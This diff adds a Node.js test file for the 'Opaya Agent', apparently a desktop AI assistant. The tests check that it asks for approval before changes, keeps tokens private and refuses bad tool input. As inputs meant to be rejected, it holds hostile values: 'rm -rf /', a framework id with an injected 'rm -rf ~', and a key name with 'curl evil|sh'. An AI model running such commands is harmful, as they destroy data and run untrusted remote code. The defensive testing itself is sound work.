@@ -1,0 +1,57 @@
+'use strict';
+const {test}=require('node:test');const assert=require('node:assert/strict');const fs=require('node:fs/promises');const path=require('node:path');
+const {Broker}=require('../desktop/broker.cjs');const {Store,Vault}=require('../desktop/store.cjs');const {OpayaAgent}=require('../desktop/opaya-agent.cjs');const catalog=require('../desktop/catalog.cjs');const {temp,secure}=require('./helpers.cjs');
+const apiAgent=(name,port)=>({name,provider:'hermes',protocol:'openai',transport:'http',endpoint:`http://127.0.0.1:${port}/v1`,model:'hermes-agent'});
+// A scripted OpenAI-compatible endpoint: each call returns the next scripted assistant message.
+function model(script){const requests=[];return {requests,fetch:async(url,init)=>{requests.push({url,body:init.body?JSON.parse(init.body):null,headers:init.headers});const message=script.shift()||{content:'done'};return {ok:true,status:200,json:async()=>url.endsWith('/models')?{data:[{id:'m1'}]}:{choices:[{message}]}};}};}
+const call=(name,args={})=>({content:'',tool_calls:[{id:'c'+Math.random(),type:'function',function:{name,arguments:JSON.stringify(args)}}]});
+async function fixture(t,script,{allow=true}={}){
+  const root=await temp(t),approvals=[],commands=[];
+  const approve=async(_a,title,detail)=>{approvals.push({title,detail});return allow;};
+  const broker=new Broker({store:new Store(root),vault:new Vault(root,secure()),emit:()=>{},approve,adapterFactory:()=>({connect:async()=>({}),close(){},run:async()=>({})})});await broker.init();t.after(()=>broker.close());
+  const terminals={describe:()=>[],attach:id=>({id,buffer:'installed ok',exited:true}),closeAgent(){}};
+  const m=model(script);
+  const agent=new OpayaAgent({root,vault:broker.vault,broker,terminals,approve,emit:()=>{},runInTerminal:async x=>{commands.push(x);return {id:'term1'};},fetchImpl:m.fetch});
+  await agent.init();await agent.saveConfig({preset:'ollama',model:'m1'});
+  return {root,agent,broker,approvals,commands,requests:m.requests};
+}
+const settle=async agent=>{for(let i=0;i<2000&&agent.busy;i++)await new Promise(r=>setTimeout(r,5));assert.equal(agent.busy,false);};
+test('Opaya Agent answers through tools and shows one reply per request',async t=>{
+  const {agent,broker,requests}=await fixture(t,[call('get_workspace'),{content:'You have one agent.'}]);
+  await broker.saveAgent({agent:apiAgent('one',8642)});
+  agent.begin('What do I have?');await settle(agent);
+  const shown=agent.describe().messages;assert.deepEqual(shown.map(m=>m.role),['user','assistant']);assert.equal(shown[1].content,'You have one agent.');assert.deepEqual(shown[1].activity,['Using get workspace']);
+  const toolResult=requests[1].body.messages.find(m=>m.role==='tool');assert.match(toolResult.content,/"name":"one"/);
+  assert.equal(requests[0].body.tools.some(t=>t.function.name==='save_connection'),true);
+});
+test('Opaya Agent changes connections only after approval and never stores tokens it is given',async t=>{
+  const {agent,broker,approvals}=await fixture(t,[call('save_connection',{connection:{...apiAgent('added',8650),token:'secret-token'}}),{content:'Added.'}]);
+  agent.begin('Add my gateway');await settle(agent);
+  assert.equal(approvals.length,1);assert.match(approvals[0].title,/Add connection "added"/);assert(!approvals[0].detail.includes('secret-token'));
+  assert.equal(broker.data.agents[0].name,'added');assert.equal(broker.vault.has(broker.data.agents[0].id),false);
+});
+test('declined approvals stop changes and installs; unknown tools and bad input are refused',async t=>{
+  const {agent,broker,commands,requests}=await fixture(t,[call('save_machine',{machine:{alias:'vps'}}),call('install_framework',{framework_id:'codex'}),call('run_shell',{command:'rm -rf /'}),call('install_framework',{framework_id:'codex; rm -rf ~'}),{content:'ok'}],{allow:false});
+  agent.begin('set things up');await settle(agent);
+  assert.equal(broker.data.hosts.length,0);assert.equal(commands.length,0);
+  const results=requests.at(-1).body.messages.filter(m=>m.role==='tool').map(m=>JSON.parse(m.content).error);
+  assert.match(results[0],/declined/);assert.match(results[1],/declined/);assert.match(results[2],/Unknown tool/);assert.match(results[3],/Unknown agent framework/);
+});
+test('approved installs run the fixed catalog command in a visible terminal',async t=>{
+  const {agent,commands,approvals}=await fixture(t,[call('install_framework',{framework_id:'codex'}),{content:'Installing.'}]);
+  agent.begin('install codex');await settle(agent);
+  assert.equal(commands.length,1);assert.equal(commands[0].command,catalog.command('codex',{remote:false}).command);assert.equal(commands[0].host,null);assert.match(approvals[0].detail,/npm install -g @openai\/codex/);
+});
+test('notes stay inside the agent home folder and model endpoints follow the same rules as agents',async t=>{
+  const {agent,root}=await fixture(t,[call('write_notes',{content:'Hermes runs on vps.'}),{content:'Saved.'}]);
+  agent.begin('remember');await settle(agent);
+  assert.equal(await fs.readFile(path.join(root,'opaya-agent','notes.md'),'utf8'),'Hermes runs on vps.');
+  await assert.rejects(()=>agent.saveConfig({preset:'custom',baseUrl:'http://example.com/v1',model:'x'}),/HTTPS|plain|loopback|public/i);
+  await assert.rejects(()=>agent.saveConfig({preset:'nope',model:'x'}),/Unknown model provider/);
+  assert.throws(()=>new OpayaAgent({root,vault:null,broker:null,terminals:null}).begin('x'),/Connect the Opaya Agent/);
+});
+test('ssh key actions reject names that could inject shell syntax',async t=>{
+  const {agent,commands,requests}=await fixture(t,[call('ssh_key',{action:'generate',key_name:'x; curl evil|sh'}),{content:'no'}]);
+  agent.begin('make a key');await settle(agent);
+  assert.equal(commands.length,0);assert.match(JSON.parse(requests.at(-1).body.messages.find(m=>m.role==='tool').content).error,/key name/);
+});
